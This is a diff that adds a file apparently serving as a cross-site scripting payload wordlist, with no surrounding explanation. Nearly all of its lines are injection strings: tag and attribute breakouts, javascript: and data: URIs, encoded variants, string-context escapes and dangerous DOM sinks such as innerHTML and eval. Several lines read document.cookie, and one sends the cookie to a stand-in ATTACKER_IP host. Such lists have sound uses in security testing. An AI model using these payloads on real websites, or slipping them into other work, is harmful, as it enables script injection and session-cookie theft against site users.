@@ -1,0 +1,67 @@
+#<img src=x onerror=alert(1)>
+#<script>alert(1)</script>
+#<svg onload=alert(1)>
+javascript:alert(1)
+javascript:alert(document.cookie)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+"><img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+"><svg onload=alert(1)>
+'><img src=x onerror=alert(1)>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+\"><img src=x onerror=alert(1)>
+</script><img src=x onerror=alert(1)>
+<img src=x onerror=alert(1)>
+<script>alert(1)</script>
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+&lt;img src=x onerror=alert(1)&gt;
+&#60;img src=x onerror=alert(1)&#62;
+;alert(1)
+;alert(1)//
+;alert(document.cookie)//
+'-alert(1)-'
+"-alert(1)-"
+'-alert(1)-'
+"-alert(1)-"
+`-alert(1)-`
+'-alert(document.cookie)-'
+';alert(1)//
+";alert(1)//
+;},alert(1),function(){
+'+alert(1)+'
+"+alert(1)+"
+`+alert(1)+`
+);alert(1)//
+};alert(1)//
+]]>alert(1)
+</script><img src=x onerror=alert(1)>
+
+},alert(1)
+{
+
+;alert(1)
+
+location.href='http://ATTACKER_IP/?c='+document.cookie
+location='javascript:alert(1)'
+window.location='javascript:alert(1)'
+document.write('<img src=x onerror=alert(1)>')
+document.write('<script>alert(1)<\/script>')
+document.body.innerHTML='<img src=x onerror=alert(1)>'
+document.body.innerHTML+='<img src=x onerror=alert(1)>'
+element.innerHTML='<img src=x onerror=alert(1)>'
+element.outerHTML='<img src=x onerror=alert(1)>'
+element.insertAdjacentHTML('beforeend','<img src=x onerror=alert(1)>')
+eval('alert(1)')
+eval(atob('YWxlcnQoMSk='))
+setTimeout('alert(1)',0)
+setInterval('alert(1)',1)
+Function('alert(1)')()
+new Function('alert(1)')()
+window.onload=function(){alert(1)}
+$(document).ready(function(){alert(1)})
+$.ajax({url:'javascript:alert(1)'})
+$.get('javascript:alert(1)')
+$.post('javascript:alert(1)')
+$.load('javascript:alert(1)')
